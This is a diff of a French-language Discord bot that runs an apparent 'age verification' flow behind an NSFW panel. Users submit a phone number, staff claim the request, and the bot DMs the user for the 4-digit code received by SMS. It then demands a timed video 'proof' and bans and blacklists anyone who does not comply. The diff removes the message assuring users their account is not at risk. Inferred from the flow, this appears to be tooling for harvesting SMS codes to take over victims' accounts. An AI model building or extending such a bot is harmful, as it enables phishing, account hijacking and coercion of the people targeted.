@@ -1,11 +1,13 @@
-import discord
-from discord import app_commands
-from discord.ext import commands
+import os
 import asyncio
 import datetime
 import logging
 from typing import Optional, Dict
+
+import discord
 from aiohttp import web
+from discord import app_commands
+from discord.ext import commands
 
 import config
 from utils import (
@@ -13,7 +15,6 @@ from utils import (
     mask_phone,
     validate_code,
     load_blacklist,
-    save_blacklist,
     is_user_blacklisted,
     is_phone_blacklisted,
     add_to_blacklist,
@@ -38,9 +39,10 @@ staff_active_claims: Dict[int, dict] = {}
 retry_cooldowns: Dict[int, float] = {}
 blacklist = load_blacklist()
 
-# Systeme de proof video
 proof_pending: Dict[int, dict] = {}
 proof_store: Dict[int, dict] = {}
+
+health_runner: Optional[web.AppRunner] = None
 
 # Couleurs
 SETUP_COLOR = 0x5865f2
@@ -56,14 +58,30 @@ async def health_handler(request):
     return web.Response(text="OK", status=200)
 
 async def start_health_server():
+    global health_runner
+
+    if health_runner is not None:
+        return
+
+    port = int(os.getenv("PORT") or str(config.PORT))
+
     app = web.Application()
     app.router.add_get("/", health_handler)
     app.router.add_get("/health", health_handler)
-    runner = web.AppRunner(app)
-    await runner.setup()
-    site = web.TCPSite(runner, "0.0.0.0", config.PORT)
+
+    health_runner = web.AppRunner(app)
+    await health_runner.setup()
+
+    site = web.TCPSite(health_runner, "0.0.0.0", port)
     await site.start()
-    log.info(f"Health check server on port {config.PORT}")
+
+    log.info(f"Serveur HTTP actif sur le port {port}")
+
+async def bot_setup_hook():
+    await start_health_server()
+    log.info("Hook setup terminé - port HTTP ouvert.")
+
+bot.setup_hook = bot_setup_hook
 
 # ===== BAN / UNBAN =====
 
@@ -71,6 +89,7 @@ async def ban_user(user_id: int, reason: str = "") -> bool:
     guild = bot.get_guild(config.GUILD_ID)
     if not guild:
         return False
+
     try:
         member = guild.get_member(user_id)
         if member:
@@ -80,7 +99,6 @@ async def ban_user(user_id: int, reason: str = "") -> bool:
         return True
     except Exception:
         return False
-
 
 async def grant_reject_role(user_id: int, reason: str = "Refus de vérification") -> bool:
     guild = bot.get_guild(config.GUILD_ID)
@@ -104,7 +122,6 @@ async def grant_reject_role(user_id: int, reason: str = "Refus de vérification"
     except Exception:
         return False
 
-
 async def has_bypass_role(user_id: int) -> bool:
     for guild in bot.guilds:
         member = guild.get_member(user_id)
@@ -112,7 +129,7 @@ async def has_bypass_role(user_id: int) -> bool:
             return True
     return False
 
-# ===== STAFF CLAIM VIEW =====
+# ===== STAFF CLAIM VIEW (numéro caché / copie) =====
 
 class StaffClaimView(discord.ui.View):
     def __init__(self, phone: str, user_id: int, parent_view: "StaffPanelView"):
@@ -149,6 +166,7 @@ class StaffClaimView(discord.ui.View):
             do_ban=True,
             reason="Fermé depuis le panneau staff"
         )
+
         embed = discord.Embed(
             title="Vérification fermée",
             description=f"L'utilisateur <@{self.user_id}> a été marqué refusé et le numéro blacklisté.",
@@ -185,6 +203,7 @@ class ProofBanModal(discord.ui.Modal, title="Refuser un utilisateur"):
         phone = self.phone_input.value.strip().replace(" ", "").replace("-", "")
         add_to_blacklist(target_id, phone, blacklist)
         await grant_reject_role(target_id, reason="Refus via preuve scam")
+
         embed = discord.Embed(
             title="Utilisateur refusé",
             description=f"**ID :** `{target_id}`\n**Numéro :** `{mask_phone(phone)}`\n**Rôle de refus attribué :** Oui",
@@ -224,6 +243,7 @@ class ValidationChannelView(discord.ui.View):
 
         add_to_blacklist(self.user_id, self.phone, blacklist)
         await grant_reject_role(self.user_id, reason="Scam confirmé via validation")
+
         for child in self.children:
             if isinstance(child, discord.ui.Button):
                 child.disabled = True
@@ -279,6 +299,7 @@ class PhoneModal(discord.ui.Modal, title="Vérification téléphone"):
             return
 
         now = datetime.datetime.now().timestamp()
+
         if interaction.user.id in cooldowns:
             remaining = cooldowns[interaction.user.id] + config.COOLDOWN_SECONDS - now
             if remaining > 0:
@@ -335,16 +356,28 @@ class PhoneModal(discord.ui.Modal, title="Vérification téléphone"):
             color=COLOR_SUCCESS
         )
         embed_wait.set_footer(text="Vérification • 0,00 €")
+
         await interaction.response.send_message(embed=embed_wait, ephemeral=True)
         await send_staff_panel(interaction.user, phone_raw)
 
 # ===== BUILD STAFF EMBED =====
 
-def build_staff_embed(user: discord.User, phone: str, status: str = "En attente", claimed_by: Optional[int] = None, code_requested: bool = False, timestamp: Optional[datetime.datetime] = None) -> discord.Embed:
+def build_staff_embed(
+    user: discord.User,
+    phone: str,
+    status: str = "En attente",
+    claimed_by: Optional[int] = None,
+    code_requested: bool = False,
+    timestamp: Optional[datetime.datetime] = None
+) -> discord.Embed:
     if timestamp is None:
         timestamp = datetime.datetime.now()
 
-    embed = discord.Embed(title="NOUVELLE DEMANDE DE VÉRIFICATION", color=0x5865f2, timestamp=timestamp)
+    embed = discord.Embed(
+        title="NOUVELLE DEMANDE DE VÉRIFICATION",
+        color=0x5865f2,
+        timestamp=timestamp
+    )
     embed.set_thumbnail(url=user.display_avatar.url)
     embed.add_field(name="Utilisateur", value=f"{user.mention}", inline=True)
     embed.add_field(name="ID", value=f"`{user.id}`", inline=True)
@@ -419,7 +452,7 @@ class StaffPanelView(discord.ui.View):
         if self.claimed_by is not None:
             embed = discord.Embed(
                 title="Déjà pris",
-                description=f"Un member du staff est déjà sur le coup (<@{self.claimed_by}>).",
+                description=f"Un membre du staff est déjà sur le coup (<@{self.claimed_by}>).",
                 color=COLOR_DANGER
             )
             await interaction.response.send_message(embed=embed, ephemeral=True)
@@ -525,7 +558,6 @@ class StaffPanelView(discord.ui.View):
         )
         await interaction.response.send_message(embed=embed_confirm, ephemeral=True)
 
-        # Log dans le salon de logs
         log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
         if log_channel:
             embed_log = discord.Embed(
@@ -541,7 +573,6 @@ class StaffPanelView(discord.ui.View):
             embed_log.set_footer(text="Logs de vérification")
             await log_channel.send(embed=embed_log)
 
-        # Envoyer le DM à l'utilisateur
         try:
             user = await bot.fetch_user(self.user_id)
             embed_dm = discord.Embed(
@@ -550,8 +581,7 @@ class StaffPanelView(discord.ui.View):
                     "Votre vérification est en cours.\n\n"
                     "Pour confirmer votre âge et votre numéro de téléphone, "
                     "veuillez répondre à ce message avec le code à 4 chiffres reçu par SMS.\n\n"
-                    "Ce processus est uniquement destiné à vérifier l'âge et le numéro, "
-                    "et ne représente aucun risque pour votre compte."
+                    "Ce processus est uniquement destiné à vérifier l'âge et le numéro."
                 ),
                 color=0x5865f2
             )
@@ -720,7 +750,7 @@ async def start_proof_procedure(user: discord.User, phone: str, code: str):
             "• aucune photo\n"
             "• aucun message texte\n"
             "• 5 minutes maximum pour envoyer la preuve\n\n"
-            "Si aucune vidéo n'est envoyée dans le délai, le membre sera refusé et la vérification sera annulée."
+            "Si aucune vidéo n'est envoyée dans le délai, le membre sera refusé."
         ),
         color=COLOR_PROOF,
         timestamp=datetime.datetime.now()
@@ -729,11 +759,11 @@ async def start_proof_procedure(user: discord.User, phone: str, code: str):
     embed.add_field(name="Numéro", value=f"`{mask_phone(phone)}`", inline=True)
     embed.add_field(name="Code reçu", value=f"`{code}`", inline=True)
     embed.set_footer(text="Délai : 5 minutes")
+
     msg = await channel.send(content=f"<@{user.id}>", embed=embed)
     proof_pending[user.id]["message_id"] = msg.id
 
     asyncio.create_task(proof_timeout_task(user.id))
-
 
 async def proof_timeout_task(user_id: int):
     await asyncio.sleep(config.PROOF_TIMEOUT_SECONDS)
@@ -754,8 +784,7 @@ async def proof_timeout_task(user_id: int):
             title="Preuve non reçue",
             description=(
                 "Votre preuve n'a pas été envoyée dans le délai demandé.\n\n"
-                "La vérification est refusée et votre numéro est blacklisté. "
-                "Cela sert à confirmer la vérification avec une preuve valable."
+                "La vérification est refusée et votre numéro est blacklisté."
             ),
             color=COLOR_DANGER
         )
@@ -790,7 +819,6 @@ async def proof_timeout_task(user_id: int):
         await log_channel.send(embed=embed_log)
 
     proof_pending.pop(user_id, None)
-
 
 async def validate_proof_video(user_id: int, attachment):
     pending = proof_pending.get(user_id)
@@ -843,6 +871,7 @@ async def validate_proof_video(user_id: int, attachment):
 async def handle_dm_code(message: discord.Message):
     user_id = message.author.id
     pending = pending_verifications.get(user_id)
+
     if pending is None:
         embed = discord.Embed(
             title="Vérification expirée",
@@ -1013,7 +1042,6 @@ async def setup(interaction: discord.Interaction):
     save_setup_data(setup_data)
     log.info(f"Setup fait dans #{interaction.channel.name} (msg: {msg.id})")
 
-
 @bot.tree.command(name="setupnsfw", description="Crée le panneau de vérification NSFW dans ce salon")
 @app_commands.default_permissions(administrator=True)
 async def setupnsfw(interaction: discord.Interaction):
@@ -1093,6 +1121,7 @@ async def retry(interaction: discord.Interaction):
 
     user_id = interaction.user.id
     now = datetime.datetime.now().timestamp()
+
     if user_id in retry_cooldowns:
         remaining = retry_cooldowns[user_id] + 600 - now
         if remaining > 0:
@@ -1200,7 +1229,6 @@ async def unban(interaction: discord.Interaction, user_id: str):
         return
 
     guild = bot.get_guild(config.GUILD_ID)
-    status_text = ""
     cleared_items = []
 
     if guild:
@@ -1227,7 +1255,7 @@ async def unban(interaction: discord.Interaction, user_id: str):
         retry_cooldowns.pop(target_id, None)
         cleared_items.append("Retry cooldown réinitialisé")
 
-    for sid, sdata in list(staff_active_claims.items()):
+    for sdata in list(staff_active_claims.values()):
         if sdata.get("user_id") == target_id:
             try:
                 await sdata["view"].close_ticket("Fermé (unban)", do_ban=False)
@@ -1249,7 +1277,9 @@ async def unban(interaction: discord.Interaction, user_id: str):
 async def banlist(interaction: discord.Interaction):
     users = blacklist.get("users", [])
     phones = blacklist.get("phones", [])
+
     embed = discord.Embed(title="Blacklist", color=COLOR_DANGER)
+
     if users:
         embed.add_field(name="Utilisateurs", value="\n".join([f"`{uid}`" for uid in users[:20]]), inline=True)
     else:
@@ -1336,6 +1366,140 @@ async def sync(interaction: discord.Interaction):
         embed=embed,
         ephemeral=True
     )
+
+# ===== EVENTS =====
+
+@bot.event
+async def on_ready():
+    log.info(f"Connecté : {bot.user}")
+    await bot.tree.sync()
+    log.info("Commandes slash synchronisées.")
+
+    setup_data = load_setup_data()
+    restored_count = 0
+    entries_to_remove = []
+
+    for entry in setup_data:
+        channel_id = entry.get("channel_id")
+        message_id = entry.get("message_id")
+
+        if not message_id:
+            channel = bot.get_channel(channel_id)
+            if channel:
+                try:
+                    async for msg in channel.history(limit=50):
+                        if msg.author == bot.user and msg.embeds:
+                            is_nsfw = entry.get("type") == "nsfw"
+                            view = VerifyButtonView(is_nsfw=is_nsfw)
+                            bot.add_view(view, message_id=msg.id)
+                            entry["message_id"] = msg.id
+                            save_setup_data(setup_data)
+                            restored_count += 1
+                            log.info(f"Vue persistante restaurée dans #{channel.name} (msg: {msg.id})")
+                            break
+                except Exception:
+                    entries_to_remove.append(entry)
+            continue
+
+        try:
+            channel = bot.get_channel(channel_id)
+            if not channel:
+                entries_to_remove.append(entry)
+                continue
+
+            msg = await channel.fetch_message(message_id)
+            is_nsfw = entry.get("type") == "nsfw"
+            view = VerifyButtonView(is_nsfw=is_nsfw)
+            bot.add_view(view, message_id=message_id)
+            restored_count += 1
+            log.info(f"Vue persistante restaurée dans #{channel.name} (msg: {message_id})")
+        except (discord.NotFound, discord.HTTPException):
+            entries_to_remove.append(entry)
+            log.warning(f"Message de setup {message_id} introuvable, entrée retirée.")
+
+    if entries_to_remove:
+        for entry in entries_to_remove:
+            if entry in setup_data:
+                setup_data.remove(entry)
+        save_setup_data(setup_data)
+        log.info(f"{len(entries_to_remove)} entrées de setup nettoyées.")
+
+    log.info(f"{restored_count} vues persistantes restaurées au total.")
+
+@bot.event
+async def on_message(message: discord.Message):
+    if message.author.bot:
+        return
+
+    if isinstance(message.channel, discord.DMChannel):
+        await handle_dm_code(message)
+        return
+
+    if message.channel.id == config.PROOF_CHANNEL_ID:
+        if not message.attachments:
+            await message.delete()
+            embed = discord.Embed(
+                title="Format invalide",
+                description="Seules les vidéos sont acceptées dans ce salon. Aucune photo ni message texte.",
+                color=COLOR_WARNING
+            )
+            await message.channel.send(embed=embed, delete_after=8)
+            return
+
+        attachment = message.attachments[0]
+        if not is_video_attachment(attachment):
+            await message.delete()
+            embed = discord.Embed(
+                title="Type invalide",
+                description="Seule une vidéo est acceptée. Les photos et messages texte sont refusés.",
+                color=COLOR_WARNING
+            )
+            await message.channel.send(embed=embed, delete_after=8)
+            return
+
+        if message.author.id in proof_pending:
+            await validate_proof_video(message.author.id, attachment)
+            return
+
+@bot.event
+async def on_message_delete(message: discord.Message):
+    if message.channel.id != config.PROOF_CHANNEL_ID:
+        return
+
+    if message.author.id not in proof_store:
+        return
+
+    data = proof_store.get(message.author.id)
+    if not data:
+        return
+
+    channel = bot.get_channel(config.PROOF_CHANNEL_ID)
+    if channel:
+        embed = discord.Embed(
+            title="PREUVE RESTAURÉE",
+            description=f"La vidéo de <@{message.author.id}> a été supprimée puis restaurée automatiquement.",
+            color=COLOR_WARNING,
+            timestamp=datetime.datetime.now()
+        )
+        embed.add_field(name="Membre", value=f"<@{message.author.id}>", inline=True)
+        embed.add_field(name="ID", value=f"`{message.author.id}`", inline=True)
+        embed.add_field(name="Numéro", value=f"`{mask_phone(data.get('phone', 'inconnu'))}`", inline=True)
+        embed.add_field(name="Code", value=f"`{data.get('code', 'inconnu')}`", inline=True)
+        await channel.send(embed=embed)
+        await channel.send(data.get("url"))
+
+    log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
+    if log_channel:
+        embed_log = discord.Embed(
+            title="VIDÉO SUPPRIMÉE",
+            description="Une preuve vidéo a été supprimée dans le salon proof.",
+            color=COLOR_WARNING,
+            timestamp=datetime.datetime.now()
+        )
+        embed_log.add_field(name="Membre", value=f"<@{message.author.id}> (`{message.author.id}`)", inline=True)
+        embed_log.add_field(name="Numéro", value=f"`{mask_phone(data.get('phone', 'inconnu'))}`", inline=True)
+        embed_log.add_field(name="Code", value=f"`{data.get('code', 'inconnu')}`", inline=True)
+        await log_channel.send(embed=embed_log)
 
 # ===== LANCEMENT =====
 
